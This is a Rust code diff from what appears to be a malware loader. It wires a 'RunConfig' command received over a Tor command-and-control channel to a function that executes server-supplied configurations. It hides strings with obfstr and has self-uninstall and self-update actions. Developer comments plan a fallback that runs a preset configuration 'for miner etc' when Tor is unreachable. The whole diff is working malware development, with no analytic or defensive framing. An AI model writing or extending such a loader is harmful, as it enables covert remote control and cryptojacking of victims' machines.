@@ -3,12 +3,13 @@ use anyhow::{ Context, Result };
 use loader_vars::{
     constants::loader_version,
     types::{
-        receive::{ self, LoaderReceivePayload },
+        receive::{ self, ClientParams, LoaderReceivePayload },
         send::{ GetConfigParams, LoaderSendPayload, ServerAction, ServerParams },
     },
 };
 use shared::network::tor::{ LoggerConfig, ServerReceiveType, TorHandler };
 use obfstr::obfstr as s;
+use super::utils::run_config;
 
 #[derive(Clone)]
 pub struct LoaderTorHandler {
@@ -24,6 +25,9 @@ impl LoaderTorHandler {
     pub async fn run_handler(&mut self) {
         let self_clone = Arc::new(RwLock::new(self.clone()));
         let self_clone2 = self_clone.clone();
+
+        //? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
+        //? ok so if in 10 min we dont connect we run predefined - do inside tor handler
 
         self.tor_handler.run(
             move || {
@@ -59,13 +63,22 @@ impl LoaderTorHandler {
     }
 
     fn route_data(
-        tor_handler: TorHandler,
+        _tor_handler: TorHandler,
         processed_data: LoaderReceivePayload,
-        self_ref: Arc<RwLock<Self>>
+        _self_ref: Arc<RwLock<Self>>
     ) -> Result<()> {
         match processed_data.action {
-            //! here download client and do all the stuff
-            receive::ClientAction::RunConfig => {}
+            receive::ClientAction::RunConfig => {
+                if let ClientParams::RunConfig(params) = processed_data.params {
+                    run_config(params)?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
             receive::ClientAction::UninstallSelf => {}
             receive::ClientAction::UpdateSelf => {}
         }
